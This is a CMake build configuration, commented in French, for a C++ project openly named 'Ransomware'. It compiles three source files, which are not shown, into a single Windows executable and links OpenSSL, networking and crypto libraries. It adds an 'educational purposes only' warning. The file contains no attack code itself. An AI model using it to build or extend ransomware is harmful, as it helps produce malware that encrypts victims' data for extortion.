cmake_minimum_required(VERSION 3.10)
project(Ransomware VERSION 1.0)

# Configuration du standard C++
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Activer les optimisations de compilation en mode Release
set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} /O2 /Ob2 /GL /Gy /MT")

# Options de compilation pour Windows
if(MSVC)
    # Définir les symboles pour supprimer les avertissements de dépréciation
    add_definitions(-D_CRT_SECURE_NO_WARNINGS)
    add_definitions(-D_SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING)
    
    # Optimiser pour la vitesse et désactiver /RTC1
    add_compile_options(/O2 /Ot /GL)
    string(REPLACE "/RTC1" "" CMAKE_CXX_FLAGS_DEBUG "${CMAKE_CXX_FLAGS_DEBUG}")
endif()

# Trouver OpenSSL
find_package(OpenSSL REQUIRED)
if(NOT OPENSSL_FOUND)
    message(FATAL_ERROR "OpenSSL introuvable. Spécifiez le chemin avec -DOPENSSL_ROOT_DIR=...")
endif()

# Définir les sources - tous les fichiers nécessaires pour un seul exécutable
set(SOURCES 
    ransomware.cpp
    ransomware_wmi.cpp
    techniques_avancees.cpp
)

# Définir un seul exécutable qui contient toutes les fonctionnalités
add_executable(ransomware_complet ${SOURCES})

# Bibliothèques Windows
if(WIN32)
    target_link_libraries(ransomware_complet PRIVATE ws2_32 wininet crypt32 Shlwapi)
endif()

# Lier avec OpenSSL
target_link_libraries(ransomware_complet PRIVATE OpenSSL::SSL OpenSSL::Crypto)

# Définir les répertoires d'inclusion et de bibliothèques
target_include_directories(ransomware_complet PRIVATE ${CMAKE_CURRENT_SOURCE_DIR})

# Afficher un message d'avertissement
message(WARNING "Ce programme est destiné à des fins éducatives uniquement et ne doit pas être utilisé pour des activités illégales.")

# Installation
install(TARGETS ransomware_complet DESTINATION bin)

# Messages informatifs
message(STATUS "Configuration terminée - Utiliser 'cmake --build .' pour compiler")
message(STATUS "OpenSSL trouvé: ${OPENSSL_VERSION}") 